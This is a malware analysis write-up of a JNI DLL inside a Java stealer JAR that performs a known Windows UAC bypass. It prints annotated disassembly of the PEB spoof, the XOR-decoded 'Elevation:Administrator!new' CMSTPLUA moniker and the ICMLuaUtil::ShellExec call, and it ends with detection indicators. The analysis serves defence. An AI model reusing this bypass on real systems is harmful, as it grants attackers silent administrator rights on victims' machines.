# `peynir.dll` — the native UAC-bypass shim

`peynir.dll` (SHA-256 `9ec1331b90ce86a584320e9922a4fd1ed5afc2dce884d3ea8189c57026b8c9f7`)
sits at the root of `emre.jar`. It is a small (118 KB) PE32+ x86-64 DLL that
exports exactly two JNI symbols:

| Ordinal | RVA | Symbol |
|--------:|-----|--------|
| 1 | `0x16b0` | `JNI_OnLoad` |
| 2 | `0x1470` | `Java_com_xc17edb19a_IvTHdVAG_nativeRunElevated` |

The Java class `IvTHdVAG` also carries an inner `$ICMLuaUtil` — the giveaway.
The DLL implements **UACMe method 41** (a.k.a. the Leo Davidson bypass via
`ICMLuaUtil::ShellExec`), packaged as a JNI helper so the Java stealer can call
`IvTHdVAG.nativeRunElevated(String cmd, String args)` and get an
auto-elevated child process without a UAC prompt on default-configured
consumer Windows.

## Imports (relevant)

From `ole32.dll`:

- `CoInitialize`
- `CoGetObject`
- `CoTaskMemFree`
- `StringFromCLSID`
- `CoUninitialize`

Plus a stock `KERNEL32.dll` set and MSVC 14 CRT scaffolding. That is the entire
non-CRT surface — no networking, no crypto, no file operations. Every effect
happens through COM and PEB spoofing.

## The bypass, in JNI order

The export is a thin JNI wrapper (`0x1470`–`0x16aa`):

1. Read `arg2` and `arg3` (both `jstring`) via
   `(*env)->GetStringUTFLength` (JNIEnv vtable `+0x520`) and
   `GetStringUTFChars` (`+0x528`); copy into two `std::string`-shaped SSO
   buffers on the stack.
2. If either string is null, substitute a constant at
   `.rdata:0x180018b7c` (empty / default).
3. Call the elevation core at `sub_1800011c0(&cmd, &args)`.
4. `ReleaseStringUTFChars` (`+0x530`) on both, tear down the SSO buffers,
   return the core's boolean result (`0` / `1`) as `jboolean`.

The core (`sub_1800011c0`, ~350 bytes) does the real work:

### Step 1 — spoof `PEB->CurrentDirectory` / `DllPath`

```asm
mov  r8,  gs:[0x60]              ; TEB->ProcessEnvironmentBlock (PEB)
mov  rdx, [r8 + 0x20]            ; PEB->ProcessParameters (RTL_USER_PROCESS_PARAMETERS)
lea  r9,  [rip + 0x1b888]        ; -> .rdata:0x18001ca80  "C:\\Windows\\System32\\" (wide)
mov  [rdx + 0x68], r9            ; ProcessParameters->CurrentDirectory.Buffer  = fake
; …recompute length from the wide-char scan, patch Length + MaximumLength at +0x60/+0x62
mov  [rdx + 0x78], r9            ; ProcessParameters->DllPath.Buffer          = fake
; …patch DllPath Length/MaximumLength at +0x70/+0x72
mov  rax, [r8 + 0x18]            ; PEB->Ldr
mov  rcx, [rax + 0x20]           ; Ldr->InLoadOrderModuleList.Flink (first LDR_DATA_TABLE_ENTRY = the .exe itself)
lea  rdx, [rip + 0x1b858]        ; -> .rdata:0x18001cab0  a second wide string (the fake image path)
mov  [rcx + 0x40], rdx           ; LDR_ENTRY->FullDllName.Buffer = fake
```

This is the well-known **`RtlInitUnicodeString` / PEB auto-elevate whitelist
spoof**: the RAiLaunchAdminProcess / AIS "trusted directory" check on the
`ICMLuaUtil` factory reads the caller's image path and current directory out of
the PEB. Rewriting those fields to point at `C:\Windows\System32\`
(a whitelisted, "auto-elevate" location) makes the AIS happily hand back an
already-elevated `ICMLuaUtil` COM proxy without prompting.

The two rewritten wide strings live at `.rdata:0x18001ca80` and
`0x18001cab0` in cleartext — this part of the trick is not obfuscated at rest.

### Step 2 — XOR-decrypt the elevation moniker onto the stack

```asm
movdqa  xmm2, xmmword ptr [rip + 0x17927]   ; .rdata:0x180018bb0 (16 B, ciphertext A2)
movdqa  xmm1, xmm2
movdqu  xmm0, xmmword ptr [rip + 0x178eb]   ; .rdata:0x180018b80 (16 B, key A1)
xorps   xmm1, xmm0                          ; plaintext hi half = A2 ^ A1
movdqu  xmm0, xmmword ptr [rip + 0x178f0]   ; .rdata:0x180018b90 (16 B, key A2b)
xorps   xmm2, xmm0                          ; plaintext lo half = A2 ^ A2b
movdqa  [rbp - 0x39], xmm1
movdqa  [rbp - 0x29], xmm2
```

Two 16-byte XORs assemble a 32-byte wide string on the stack. It has the exact
length and layout of `L"Elevation:Administrator!new:"` + a stringified CLSID:

> `Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`

`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` is `CMSTPLUA` — the connection-manager
setup helper whose `ICMLuaUtil` interface exposes a `ShellExec` method that
runs as `NT AUTHORITY\SYSTEM` when the AIS decides the caller is
"auto-elevate-eligible". Combined with the PEB spoof above, this is the
Windows 7-era Leo Davidson bypass, still effective on default-configured
Windows 10/11 through the current builds when UAC is at the default level.

### Step 3 — `CoInitialize` / `CoGetObject` / vtable-slot-9 call

```asm
xor  ecx, ecx
call [rip + 0xfff7]                          ; -> IAT: ole32!CoInitialize(NULL)

lea  rcx, [rbp - 0x39]                       ; the decrypted moniker
; rdx = &BIND_OPTS (the L"..." constant at .rdata:0x180018b40, 0x1C = 28 bytes = BIND_OPTS3)
; r8  = &IID_ICMLuaUtil, r9 = &pv (output interface pointer at [rbp+0x77])
call [rip + 0xfec1]                          ; -> IAT: ole32!CoGetObject

; on success, call ICMLuaUtil->ShellExec(cmd, args, NULL, 0, SW_SHOWNORMAL)
mov  rax, [rcx]                              ; vtable
mov  r8,  r15                                ; args string
mov  rdx, r14                                ; cmd string
xor  r9d, r9d                                ; lpDirectory = NULL
mov  dword ptr [rsp+0x20], 0                 ; fMask       = 0
mov  dword ptr [rsp+0x28], 0                 ; nShow        = 0
call [rax + 0x48]                            ; vtable slot 9 = ICMLuaUtil::ShellExec
```

Interface layout confirms slot 9:

- `IUnknown`  : `QueryInterface` `+0x00`, `AddRef` `+0x08`, `Release` `+0x10`
- `ICMLuaUtil`: `SetRasCredentials` `+0x18`, … , **`ShellExec` `+0x48`**

Then `Release` (`+0x10`) and `CoUninitialize` (via the last IAT entry).

## Java side of the call

The signature reconstructed from the class layout:

```java
package com.xc17edb19a;

class IvTHdVAG {
    static { System.loadLibrary("peynir"); }
    static native boolean nativeRunElevated(String cmd, String args);
    // inner classes MyCrypt32 / NCrypt / TOKEN_ELEVATION / $ICMLuaUtil
    // are decoy / support types (some are JNA proxies for other calls).
}
```

Callers most likely pass `"cmd.exe"` / `"/c …"` or a direct path to a
follow-on binary written to `%LOCALAPPDATA%\emre\`. The JAR itself does not
need admin rights for browser-cookie theft under HKCU, so the elevated
process is presumably used to disable Defender exclusions, add a scheduled
task, or drop into `%ProgramData%` — a next-stage reverse would need the
JAR decompiled to say for sure.

## Why not `flowref-decompiler`?

The `flowref-decompiler` skill in this repo's toolchain gives machine-checked
`bv_decide` proofs of lifted x86 semantics for pure ALU / cmov / lea / setcc
paths. This DLL is COM-heavy: every effect happens through indirect calls
through an IAT and through vtable dispatch on interfaces the disassembler
cannot resolve without a symbol source. That is exactly the class of code
flowref's I0 gate is designed to refuse rather than emit for. The Windows-API
level of understanding above (which IAT slot is `CoGetObject`, which vtable
slot is `ShellExec`) is where the meaning actually lives, and it comes from
recognizing the moniker string and the interface — not from lifting the
instructions. Flowref would correctly report *unmodeled* on the whole function
and produce nothing. So this shim was reversed by hand.

## Detection

- Any process whose PEB `CurrentDirectory` or `DllPath` claims
  `C:\Windows\System32\` while its image path is under `%LOCALAPPDATA%` or
  `%APPDATA%`.
- A `javaw.exe` child that loads `peynir.dll` from a JAR-extracted temp
  directory.
- An elevated `ICMLuaUtil` COM instantiation whose parent is not a signed
  Microsoft installer helper. Sysmon Event ID 1 with `IntegrityLevel=High`
  on a process whose parent is a medium-integrity `javaw.exe`.
- `.rdata` byte pattern for the XOR-encrypted moniker: three 16-byte blobs
  at `imagebase + 0x18b80 / 0x18b90 / 0x18bb0`, whose pair-wise XOR yields
  the wide-string `Elevation:Administrator!new:{3E5FC7F9…`. A YARA rule can
  match on the CLSID text of any variant that skips the XOR step.
